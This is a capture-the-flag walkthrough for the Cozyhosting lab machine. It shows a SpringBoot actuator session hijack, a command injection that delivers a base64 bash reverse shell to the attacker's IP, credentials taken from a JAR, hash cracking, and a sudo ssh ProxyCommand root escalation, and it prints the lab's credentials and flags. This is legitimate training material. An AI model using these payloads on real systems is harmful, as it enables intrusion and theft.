# Cozyhosting - SpringBoot RCE & PostgreSQL Exploitation Walkthrough

This is a full exploitation walkthrough for the Cozyhosting machine. The target is a Linux host running a vulnerable SpringBoot web application with exposed administrative functionality that leads to command injection. The goal is to escalate to user `josh` and finally capture the root flag.

## Target Information

IP Address: 10.10.11.230  
Operating System: Ubuntu Linux  
Open Ports:  
- 22 (SSH)  
- 80 (HTTP - nginx)

## Enumeration

Ran an Nmap scan:

nmap -sC -sV -o nmap 10.10.11.230

Discovered:
- Port 22: OpenSSH 8.9p1 Ubuntu
- Port 80: nginx 1.18.0 (Ubuntu)

Website didn't load initially, so added domain to /etc/hosts:

10.10.11.230 cozyhosting.htb

Reloaded and saw a landing page. Proceeded with directory bruteforcing:

gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt -u http://cozyhosting.htb -x php,txt,js

Discovered a login page. Visited an error page and observed a SpringBoot “Whitelabel Error Page”. Confirmed backend is SpringBoot.

Used a SpringBoot-specific wordlist:

ffuf -u http://cozyhosting.htb/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/spring-boot.txt

Discovered `/actuator/` endpoints. Explored `/actuator/sessions` and found a valid session ID.

Injected it into the JSESSIONID cookie and gained admin access as user `K.anderson`.

## Exploitation - Command Injection

Captured a request to `/executessh` with BurpSuite. Found a POST request executing remote SSH-like commands.

Injected the following in the username field:

;ping${IFS}-c4${IFS}10.10.14.137;#

Confirmed command injection by receiving ICMP packets.

Then crafted a base64 reverse shell:

echo "bash -i >& /dev/tcp/10.10.14.137/6658 0>&1" | base64 -w 0

Payload:

;echo${IFS%??}"YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMzcvNjY1OCAwPiYxCg=="${IFS%??}|${IFS%??}base64${IFS%??}-d${IFS%??}|${IFS%??}bash;

Received a reverse shell on listener.

## Post-Exploitation - Reverse Engineering .jar

Located the SpringBoot application:

/app/cloudhosting-0.0.1.jar

Downloaded it using:

python3 -m http.server 1111  
wget http://10.10.11.230:1111/cloudhosting-0.0.1.jar

Opened in JD-GUI, found PostgreSQL credentials:

Username: postgres  
Password: Vg&nvzAQ7XxR

Connected to database:

psql -h 127.0.0.1 -U postgres

Connected to database: cozyhosting  
Discovered table with admin hash. Cracked it with John:

john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt

Result:

josh : manchesterunited

## User Flag

Logged in via SSH:

ssh josh@10.10.11.230  
Password: manchesterunited

Captured user flag from:

/home/josh/user.txt  
Flag: 001e788a9504cc6e79d0b70cabecceba

## Privilege Escalation

Checked sudo permissions:

sudo -l

Found: allowed to run `ssh` with ProxyCommand option.

Used GTFObins SSH ProxyCommand escalation:

sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x

Gained root shell.

## Root Flag

Located at:

/root/root.txt  
Flag: af9a86cc816d3b359ff652e0a67602c4

## Tools Used

- nmap  
- gobuster / ffuf  
- BurpSuite  
- base64 reverse shell  
- JD-GUI  
- PostgreSQL client  
- John the Ripper  
- SSH ProxyCommand exploit

## Summary

- Discovered SpringBoot web app running behind nginx  
- Gained admin access using a leaked session ID from actuator endpoint  
- Exploited command injection to get a reverse shell  
- Extracted credentials from a JAR file and accessed PostgreSQL  
- Cracked hash to SSH as user josh  
- Escalated privileges using SSH ProxyCommand abuse  
- Captured both user and root flags

## Author

Farhanahmad Quraishi
